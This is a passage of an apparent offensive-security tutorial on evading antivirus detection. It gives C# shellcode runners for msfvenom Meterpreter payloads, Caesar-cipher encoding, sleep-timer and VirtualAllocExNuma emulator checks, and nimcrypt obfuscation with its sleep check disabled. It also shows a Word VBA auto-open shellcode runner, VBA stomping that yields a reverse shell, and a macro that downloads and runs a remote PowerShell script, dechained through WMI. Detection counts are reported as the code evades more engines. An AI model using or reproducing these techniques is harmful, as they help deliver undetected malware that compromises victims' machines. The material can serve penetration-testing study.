<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force<br/>&gt; .\clamscan.exe C:\Tools\avtest2
C:\Tools\avtest2\met_10000.bin: OK
C:\Tools\avtest2\met_11000.bin: OK
C:\Tools\avtest2\met_12000.bin: OK
C:\Tools\avtest2\met_13000.bin: OK
C:\Tools\avtest2\met_14000.bin: OK
C:\Tools\avtest2\met_15000.bin: OK
C:\Tools\avtest2\met_16000.bin: OK
C:\Tools\avtest2\met_17000.bin: OK
C:\Tools\avtest2\met_18000.bin: OK
C:\Tools\avtest2\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
C:\Tools\avtest2\met_20000.bin: Win.Trojan.MSShellcode-7 FOUND
[...]</span>
</code></div>
The offending bytes are between offsets 18000 and 19000.<br/>Let's narrow this further by lowering the interval to 100 bytes and saving to a new directory.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>&gt; Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force<br/>&gt; .\clamscan.exe C:\Tools\avtest3
C:\Tools\avtest3\met_18000.bin: OK
C:\Tools\avtest3\met_18100.bin: OK
C:\Tools\avtest3\met_18200.bin: OK
C:\Tools\avtest3\met_18300.bin: OK
C:\Tools\avtest3\met_18400.bin: OK
C:\Tools\avtest3\met_18500.bin: OK
C:\Tools\avtest3\met_18600.bin: OK
C:\Tools\avtest3\met_18700.bin: OK
C:\Tools\avtest3\met_18800.bin: OK
C:\Tools\avtest3\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND
C:\Tools\avtest3\met_19000.bin: Win.Trojan.MSShellcode-7 FOUND
[...]</span>
</code></div>
The output reveals two different signatures. The first is located between 18800 and 18900 and<br/>
the other is located between 18900 and 19000.
The best approach is to handle each signature individually, so we'll first divide the 18800 to 18900<br/>
range into 10-byte segments, saving the results to a new directory, then the other range into 10-byte segments, saving the results to a yet another new directory.<br/><br/>
Etc.<br/><br/>I know it is not the most exciting part of this subject.<br/>It is not the most effective way to bypass antivirus defenses, so let's move on.<br/><br/>
<h4 id="interav">Bypassing Antivirus with Metasploit</h4>
We could bypass antivirus with Metasploit encoders or encryptors but utilizing these is also not the most effective way to bypass antivirus defenses as of 2023, so again, let's move on.<br/><br/>
<h4 id="heh">Trying a Different Tool</h4>
Yes, with trying a different tool for the same purpose, we might be able to bypass the given antivirus solution.<br/>
A good example of this is the psexec Metasploit module, psexec.py, smbexec.py, and wmiexec.py beginner's set.<br/><br/>
<h4 id="using-obfuscated-builds">Using Obfuscated Builds</h4>
<p>The simplest way to evade AV detection is to use obfuscated build. For instance, WinPEAS has an obfuscated version that can be found here: <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230402">https://github.com/carlospolop/PEASS-ng/releases/tag/20230402</a>, <code>winPEASx64_ofs.exe</code></p><br/>
<h4 id="obfuscate-a-tool-by-yourself">Obfuscate a Tool by Yourself</h4>
<p><code>nimcrypt</code> is a linux based tool that can be used to obfuscate binaries: <a href="https://github.com/icyguider/Nimcrypt2">https://github.com/icyguider/Nimcrypt2</a>
<br/>It takes some time to setup the tool, but once it&rsquo;s setup, it&rsquo;s relatively straightforward to use.</p>
<p>Let&rsquo;s take a tool called <code>certify</code> as an example <a href="https://github.com/GhostPack/Certify">https://github.com/GhostPack/Certify</a>
<br/>This tool is often picked up by AV during execution.</p>
<p><strong>Note:</strong> the obfuscated tools may often fail on <code>sleep check</code>, my method to get around it is to comment out the following line in the <code>nimcrypt.nim</code> file and then re-build the nimcrypt binary</p>
<pre tabindex="0"><code># line 468
if not sleepAndCheck():
    echo &#34;[-] Sleep did not pass the check, exiting&#34;
    # quit()
</code></pre><p>To obfuscate a binary</p>
<pre tabindex="0"><code>&gt; ./nimcrypt -f Certify.exe -t csharp -u -e -o NimCertify.exe
</code></pre><p>Then, <code>NimCertify.exe</code> can evade AV detection is most cases.</p>
<br/>
<h4 id="interav">Bypassing Antivirus with Shellcode Runner in C#</h4>
Let's try to compile our shellcode runner, which is presented as a 64-bit application. It looks like this:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
    UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
      byte[] buf = new byte[752]{
        0xfc,0x48,0x83,0xe4...
      }

      int size = buf.Length;

      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

      Marshal.Copy(buf, 0, addr, size);

      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
  }
}</span></span>
</code></div>
Let's talk about Marshalling.<br/><br/>
In C#, marshalling refers to the process of converting data between managed and unmanaged memory.<br/>Managed memory is the memory managed by the .NET runtime, while unmanaged memory is memory managed outside of the .NET runtime, often in native code or external libraries written in languages like C or C++.<br/>Marshalling is necessary when you need to pass data between managed and unmanaged code, such as when working with platform-specific APIs, COM objects, or interoperating with native libraries.<br/>
The Marshal class in C# provides a set of methods and classes for performing marshalling operations.<br/><br/>
This should be enough talk about Marshalling for now.
<br/><br/>
The buf variable contains the shellcode, which is an un-encoded and un-encrypted 64-bit Meterpreter shellcode generated with msfvenom.<br/>
Copy the compiled executable to the Windows 10 victim machine,<br/>and perform an on-demand scan with Avira:<br/><br/>
<img src="avirascanres.png" hegiht="80" width="70%" alt="avirascanres.png">
<br/>
Nice! Our custom shellcode runner bypassed Avira's signature detection.<br/>A ClamAV scan is also clean.<br/><br/>
We would like to know how effective this bypass is. Let's scan our executable with AntiScan.Me.<br/>Looking at the results we see the following:<br/><br/>
<img src="antiscanres.png" hegiht="80" width="70%" alt="antiscanres.png">
<br/><br/>
11 of the 26 engines flagged our executable.<br/>This is not bad for a first attempt, especially considering that these engines executed both signature and heuristic scans.<br/><br/>

Remember that uploading the executable to VirusTotal also sends the data to
antivirus vendors for analysis.<br/>This could potentially expose the code we just
developed.

<h4>Encrypting the C# Shellcode Runner</h4>
The key to bypassing antivirus signature detections is custom code, and since we want to encrypt
the shellcode, we must also create a custom decryption routine to avoid detection.<br/>
We will implement the Caesar Cipher as it is a more straightforward decryption routine than, for example, aes256.<br/><br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>namespace Helper
{
  class Program
  {
    static void Main(string[] args)
    {
      byte[] buf = new byte[752] {
      0xfc,0x48,0x83,0xe4,0xf0...
      }

      byte[] encoded = new byte[buf.Length];

      for(int i = 0; i &lt; buf.Length; i++)
      {
        encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
      }
      StringBuilder hex = new StringBuilder(encoded.Length * 2);
      foreach(byte b in encoded)
      {
      hex.AppendFormat("0x{0:x2}, ", b);
      }
      Console.WriteLine("The payload is: " + hex.ToString());
    }
  }
}</span></span></code></div>
<br/>
Now we can modify our existing C# shellcode runner project by copying the encrypted shellcode<br/>
into it and adding the decrypting routine.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
    UInt32 dwMilliseconds);

    static void Main(string[] args)
    {
      byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...}
      for(int i = 0; i &lt; buf.Length; i++)
      {
        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
      }

      int size = buf.Length;

      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

      Marshal.Copy(buf, 0, addr, size);

      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
  }
}</span></span></code></div>
Now, let’s test the effectiveness of this bypass technique. Since this unencrypted project
bypassed both Avira and ClamAV, we’ll scan it with AntiScan.Me:
<br/><br/>
<img src="antiscanreskeepingitg.png" height="75%" width="65%" alt="antiscanreskeepingitg.png">
<br/><br/>
Only 7 out of 26 antivirus programs flagged our code.<br/>This is a huge
improvement over our previous attempt, which flagged 11 times.<br/><br/>
At this point, we have had relative success bypassing signature detection.<br/>In the next section, we
will attempt to bypass heuristics detection techniques.
<br/><br/>
<h4 id="messing1">Simple Sleep Timers</h4>
One of the more ancient techniques used to bypass behavior analysis involves exploiting time delays. In cases where an application is active within a simulator and the heuristics engine comes across a pause or sleep command, it will accelerate through the delay until the point at which the application recommences it's operations.<br/><br/>This strategy prevents the need to endure a potentially lengthy waiting period during a heuristics scan.<br/><br/>

A straightforward approach to capitalize on this method employs the Win32 Sleep API.<br/><br/>This particular API suspends the execution of the calling thread for a designated duration. When this segment of code is being simulated, the emulator identifies the Sleep call and expeditiously advances through the instruction.<br/><br/>

By comparing the time of day before and after the Sleep command, we can easily ascertain whether the call was indeed fast-forwarded.<br/><br/>As an illustration, we can inject a two-second pause, and if the time comparisons show that the two seconds haven't elapsed during the instruction, we can deduce that the simulation is active.<br/><br/>Consequently, we can exit the process prior to executing any suspicious code.<br/><br/>

Let's put this into practice.<br/><br/>We will reuse the original unencrypted C# shellcode runner and integrate the Sleep command into the Main method to identify temporal gaps.<br/><br/>In order to accomplish this, we must also include the pinvoke import declaration for Sleep:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
    UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    static void Main(string[] args)

    static void Main(string[] args)
    {
      DateTime t1 = DateTime.Now;
      Sleep(2000);
      double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
      if(t2 &lt; 1.5)
      {
        return;
      }

      byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...}
      for(int i = 0; i &lt; buf.Length; i++)
      {
        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
      }

      int size = buf.Length;

      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

      Marshal.Copy(buf, 0, addr, size);

      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
  }
}</span></span></code></div>
Through the integration of the Sleep command and the time-lapse detection into the Caesar ciphered C# shellcode runner project, we have effectively merged these two methodologies.<br/>Executing a scan using the compiled executable produces a noteworthy outcome:<br/><br/>
<img src="antiscanreshs.png" height="60%" width="60%" alt="antiscanhs.png"><br/><br/>
This time, our code drew attention from merely six products.<br/><br/>This signifies progress, given that we've managed to outmaneuver Windows Defender's detection - a feature inherent in the majority of contemporary Windows-based systems.<br/><br/>
The enhanced success in evading detection is quite remarkable, especially when considering the longstanding utilization of the Sleep function for evading behavioral analysis for over ten years.<br/><br/>
If we only used simple sleep timers, the results would have not improved as we would have not bypass the signature based detections.<br/><br/>
We are now on the brink of effectively circumventing all the antivirus products supported by antiscan.me.<br/><br/>As a result, in the ensuing section, we will transition to exploring alternative heuristic bypass techniques.<br/>
<br/>
<h4 id="messing2">Non-emulated APIs</h4>
Antivirus emulator engines simulate the execution of common executable file formats and functions.<br/>We can try bypassing detection by using a function (usually a Win32 API) that is either emulated incorrectly or not emulated at all.<br/><br/>
Locating non-emulated APIs generally involves two methods.<br/><br/>The first is reverse engineering the antivirus emulator, which is time-consuming due to it's complex software.<br/><br/>The second, simpler approach is testing various APIs against the AV engine.<br/><br/>The idea is that if the AV emulator encounters a non-emulated API, execution will fail.<br/><br/>In such cases, our malicious program can identify AV emulation by comparing the API result to the expected result.<br/><br/>
Consider the relatively uncommon Win32 VirtualAllocExNuma API as an example.<br/><br/>The "Numa" suffix refers to a system design for optimizing memory usage on multi-processor servers.<br/>This API allocates memory like VirtualAllocEx but is optimized for a specific CPU.<br/><br/>Such optimization isn't necessary on a standard single-CPU workstation.<br/><br/>
Because of this, some antivirus vendors do not emulate VirtualAllocExNuma and, in this case, it's
execution by the AV emulator will not result in a successful memory allocation.<br/><br/>Let's try this outwith a simple POC.<br/><br/>
Function prototype for VirtualAllocEx and VirtualAllocExNuma:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect
  );

LPVOID VirtualAllocExNuma(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect,
  <b>DWORD nndPreferred</b>
);
</span></span></code></div>
In the two function prototypes above, the last argument is different and is a simple DWORD type.<br/>
This means we can reuse the pinvoke import for VirtualAllocEx and manually add an extra
argument of type UInt32.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
  static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
  uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
</span></span></code></div>
As for VirtualALlocEx, the Numa version accepts as the first argument the handle for the process
in which we want to allocate memory.<br/>In our case, we simply want to allocate memory in the
address space of the currently running process.<br/>An easy way to obtain a handle to the current
process is with the Win32 GetCurrentProcess API.<br/>This does not take arguments, so the import
is rather simple
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>[DllImport("kernel32.dll")]
  static extern IntPtr GetCurrentProcess();
</span></span></code></div>
Finally, it's important to designate the desired NUMA node for the allocation.<br/>In the context of a multiprocessing system, this corresponds to the specific CPU where our allocated physical memory should be located.<br/>As we anticipate working on a single-CPU workstation, we set this value to "0" to indicate the first node.<br/>The code snippet below illustrates the usage of VirtualAllocExNuma and the subsequent detection of emulation.<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>IntPtr memorypointer = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
if(memorypointer == null)
{
  return;
}
</span></span></code></div>
Putting it all together:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span>using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
  class Program
  {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
    uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle,
    UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    static void Main(string[] args)
    {
      IntPtr memorypointer = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
      if(memorypointer == null)
      {
        return;
      }

      byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...}
      for(int i = 0; i &lt; buf.Length; i++)
      {
        buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
      }

      int size = buf.Length;

      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

      Marshal.Copy(buf, 0, addr, size);

      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
  }
}</span></span></code></div>
Compiling it and putting it up to AntiScan.me shows the following:<br/><br/>
<img src="antiscanresmemptr.png" height="60%" width="60%" alt="antiscanresmemptr.png"><br/><br/>
Great job!<br/>Our freshly developed code triggered alerts in just four antivirus products.<br/>By blending straightforward encryption and non-emulated APIs,<br/>we've effectively circumvented the majority of antivirus solutions supported by AntiScan.Me.<br/>With our C# shellcode runner proving successful, we can now broaden our tactics to encompass other attack vectors, including Microsoft Office documents and PowerShell.<br/>
<br/>
<h3 id="messing2">Bypassing Antivirus with Microsoft Office</h3>
<h4 id="messing2">Bypassing Antivirus in VBA</h4>
The complete VBA shellcode runner:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As
LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As
Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Function mymacro()
Dim buf As Variant
Dim addr As LongPtr
Dim counter As Long
Dim data As Long
Dim res As Long
buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82,
12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32,
193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120,
227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1,
214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10,
104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19,
114, 111, 106, 0, 83, 255, 213)
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
For counter = LBound(buf) To UBound(buf)
data = buf(counter)
res = RtlMoveMemory(addr + counter, data, 1)
Next counter
res = CreateThread(0, 0, addr, 0, 0, 0)
Sub Document_Open()
mymacro
End Sub
Sub AutoOpen()
mymacro
End Sub
</span></span></code></div><br/>
The results:<br/><br/>
<img src="antiscanresvba.png" height="60%" width="60%" alt="antiscanresmemptr.png"><br/><br/>
If we implement the Caesar encryption and the time-lapse detection with the Sleep function,<br/>
testing the updated Microsoft Word document through AntiScan.Me yields a surprisingly
unchanged detection rate of<br/>7 out of 26.<br/><br/>
Considering the impressive effectiveness of the heuristics bypass technique in C#, it's probable that the problem is linked to signature detection. This is understandable considering the widespread use of Microsoft Office documents by malware creators. Because this attack vector is so commonly employed, antivirus providers have devoted considerable resources to its detection. To minimize the detection rate, we will explore a recently developed bypass technique tailored specifically for Microsoft Office.<br/>
<h4>Last Stomp On Microsoft Word</h4>
Word and Excel documents using the modern macro-enabled formats can be<br/>
unzipped with 7zip and the contents inspected in a hex editor.<br/>
There are no official tools for unwrapping .doc files, so we'll turn to the third party FlexHEX<br/>
application, which is preinstalled on our Windows 10 machine part.<br/>Let's use this tool to
inspect our most recent revision of the VBA shellcode runner.<br/><br/>
We set up an nc listener if we haven't already.
<br/><br/>
First, we'll open FlexHEX and navigate to File > Open > OLE Compound File...<br/><br/>
<img src="imagepvoqb2.png" height="50%" width="50%" alt="imagepvoqb2.png">
<br/><br/>
We open the Microsoft Word document in the popped up file browser window.<br/>
If we expand the Macro and VBA folders, we obtain this view:<br/><br/>
<img src="imagew5s.png" height="40%" width="40%" alt="imagew5s.png"><br/><br/>
This view shows all the embedded files and folders included in the document.<br/>Any content related
to VBA macros are located in the Macros folder highlighted above.<br/><br/>
For Microsoft Word or Excel documents using the newer macro enabled formats,<br/>
all macro-related information is stored in the <b>vbaProject.bin</b> file inside the zipped
archive.<br/><br/>
The PROJECT file contains project information. Not a surprise.<br/>
The graphical VBA editor also determines which macros to show based on the contents of this file.<br/>
If we click this file in the Navigator window, the content is displayed in the upper-left window.<br/><br/>
As highlighted below, the binary content contains the ASCII<br/>
"Module=NewMacros", which is what the GUI editor uses to link the displayed macros.<br/><br/>
<img src="imagew6s.png" height="70%" width="70%" alt="imagew6s.png"><br/><br/>
If we could remove this link in the editor, it could hide our macro from within the graphical Office VBA editor.<br/>
To remove this link in the graphical editor, we can simply remove the line by replacing it with null bytes.<br/>
This is done by highlighting the ASCII string and navigating to Edit > Insert Zero Block, which opens a new window.<br/>
We can save the change by clicking OK.<br/><br/>
<img src="imagew7s.png" height="50%" width="50%" alt="imagew7s.png"><br/><br/>
With the null bytes saved, we'll close FlexHEX to recompress the file.<br/>
View from the Office VBA editor before editing on the left and the result of
the edit on the right side:<br/><br/>
<img src="imagew8s.png" height="50%" width="50%" alt="imagew8s.png"><br/><br/>
This helps prevent manual detection, but AntiScan.Me reports that we have not reduced the<br/>
detection rate since the macro still exists and will still be executed.<br/>
However, if we could somehow remove the macro yet still have it execute,<br/>we may enjoy a significant reduction in our detection rate.<br/><br/>
To understand how this unlikely scenario is possible, we must dig deeper into the implementation
of VBA code. The key concept here is PerformanceCache, which is a structure present in both
_VBA_PROJECT and NewMacros as shown below.<br/><br/>
<img src="imagew5s.png" height="40%" width="40%" alt="imagew5s.png"><br/><br/>
Examining the documentation reveals that this represents a stored and precompiled rendition of the VBA text-based code, referred to as P-code.<br/>
The P-code is essentially a compiled adaptation of the VBA text-based code tailored for the specific edition of Microsoft Office and VBA on which it was originally generated.<br/>
To put it differently, when a Microsoft Word document is accessed on a different computer employing the identical version and edition of Microsoft Word, the pre-existing compiled P-code is executed, bypassing the necessity for the VBA interpreter to translate the text-based VBA code.<br/>
With the assistance of FlexHEX, we can examine the P-code contained within the NewMacros file, as displayed below.<br/><br/>
<img src="pword.png" height="70%" width="70%" alt="pword.png"><br/><br/>
In the right-side pane, we notice the Win32 API names inside the compiled P-code, while the rest
of the code is in a pure binary format.<br/><br/>
Scrolling towards the bottom of NewMacros, we find a partially-compressed version of the VBA
source code.<br/><br/>
<img src="pword2.png" height="70%" width="70%" alt="pword2.png"><br/><br/>
Even partially compressed, we notice the Win32 API imports in the highlighted part of the figure<br/>
following the statement Attribute VB_Name = "New Macros".<br/>
The remaining part of the VBA code follows if we were to scroll even further down.<br/><br/>
At the beginning of the <b>_VBA_PROJECT</b> file we can see the Microsoft Office and VBA version.<br/><br/>
<img src="pword3.png" height="70%" width="70%" alt="pword3.png"><br/><br/>
As we will demonstrate, only a few antivirus products actually inspect the P-code at all.<br/>
This concept of removing the VBA source code has been termed VBA Stomping.<br/><br/>
Let's perform this evasion technique with our encrypted shellcode runner by locating the VBA<br/>
source code inside <b>NewMacros</b> as previously shown.<br/>
We need to mark the bytes that start with the ASCII characters "Attribute VB_Name" as shown below and select all the remaining bytes.<br/><br/>
<img src="pword4.png" height="70%" width="70%" alt="pword4.png"><br/><br/>
We are marking to the end of the VBA source code:<br/><br/>
<img src="pword5.png" height="70%" width="70%" alt="pword5.png"><br/><br/>
We'll navigate to Edit > Insert Zero Block and accept the size<br/>
of modifications. The start of the modified VBA source code now looks like this:<br/><br/>
<img src="pword6.png" height="70%" width="70%" alt="pword6.png"><br/><br/>
Once the VBA source code has been stomped, we'll save the Microsoft Word document and close<br/>
FlexHEX to allow it to be re-compressed.<br/>
If we open the Word document, we'll notice the "Enable Content" security warning but if we open<br/>
the VBA editor, we'll find that the NewMacro container is completely empty.<br/><br/>
<img src="pword7.png" height="70%" width="70%" alt="pword7.png"><br/><br/>
When we accept the security
warning and let the VBA macro execute, we notice two things.<br/>
First, we obtain a reverse Meterpreter shell, which demonstrates that even with the VBA source code removed,<br/>
<br/>the P-code is executed and the attack still works.<br/>
Second, the VBA source code has reappeared inside the VBA editor as shown below.<br/>
Microsoft Word decompiled the P-code and wrote it back into the editor while executing it.<br/><br/>
<img src="pword8.png" height="70%" width="70%" alt="pword8.png"><br/><br/>
AntiScan.Me reports an improved detection rate of only four flags.<br/><br/>
<img src="pword9.png" height="70%" width="70%" alt="pword9.png"><br/><br/>
We can automate this whole process with the EvilClippy.exe tool.<br/>
This YouTube video was useful, it is about using EvilClippy.exe:<br/>
<a href="https://www.youtube.com/watch?v=xlfce2ITeNI" target="_blank">https://www.youtube.com/watch?v=xlfce2ITeNI</a><br/><br/>

<h4>Hiding PowerShell Inside VBA</h4>
Basic PowerShell shellcode runner:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object
system.net.webclient).downloadstring('http://10.11.0.100/run.txt'))"
  Shell strArg, vbHide
End Sub</span></span></code></div><br/>
Detection rate of PowerShell shellcode runner:<br/><br/>
<img src="avtestres.png" height="70%" width="70%" alt="avtestres.png"><br/><br/>
There are two main issues that cause the high detection rate: the use of the Shell method and the
clearly identifiable PowerShell download cradle.<br/><br/>
Now we will attempt to solve both of these issues.
<h5>Dechaining with WMI</h5>
To address these issues, we’ll first address the issue of PowerShell being a child process of the<br/>
Office program by leveraging the Windows Management Instrumentation (WMI) framework.<br/>
WMI is an old native part of the Windows operating system that is still poorly documented and relatively unknown.<br/>
We can use WMI to query, filter, and resolve a host of information on a Windows operating system.<br/>
We can also use it to invoke a multitude of actions, and can even use it to create a new process.<br/><br/>

Creating a PowerShell process with WMI:<br/>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span>Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
Sub AutoOpen()
  Mymacro
End Sub</span></span></code></div><br/>
When the macro is executed, a new PowerShell prompt opens and Process Explorer reveals that<br/>
PowerShell is indeed running as a child process of WmiPrvSE.exe and not Microsoft Word.<br/><br/>
<img src="processexplorer.png" height="70%" width="70%" alt="processexplorer.png"><br/><br/>
This could certainly work for our purposes, however PowerShell is running as a 64-bit process,<br/>
which means we must update the PowerShell shellcode runner script accordingly.<br/>
We can update the PowerShell argument for the Create method to include the entire download cradle.<br/><br/>
